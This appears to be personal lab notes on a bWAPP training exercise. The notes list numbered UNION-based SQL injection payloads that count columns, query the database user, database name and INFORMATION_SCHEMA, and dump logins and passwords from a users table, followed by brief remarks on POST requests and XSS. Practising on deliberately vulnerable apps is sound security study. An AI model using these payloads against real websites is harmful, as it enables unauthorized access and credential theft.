1) `movie=-1 union select 1,group_concat(title),3,4,5,6,7 from movies`
2) Number of columns, brute force with order by `http://localhost/bWAPP/sqli_2.php?movie=1 order by 8-- -` When we get an error, means we don't have that number of columns.
3) 5 columns are displayed in the output.
4) `movie=-1 union all select 1,user(),3,4,5,6,7`
5) `movie=-1 union all select 1,database(),3,4,5,6,7`
6) `movie=-1 union all select 1,group_concat(column_name),3,4,5,6,7 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='movies'`
7) `movie=-1 union all select 1,group_concat(table_name),3,4,5,6,7 FROM INFORMATION_SCHEMA.TABLES`
8) `movie=-1 union all select 1,group_concat(login),group_concat(password),4,5,6,7 FROM users`

If the website used POST and not GET then we wouldn't see the changes in the URL as the data would be sent in the body of the POST request and not in the header of GET. If it was a select POST request we would need to capture and hold the packet and then change it and send it. If it would be search POST request, we could just write it in the form.

With AJAX we could use java script code injection and XSS in case the backend wasn't configured correctly.
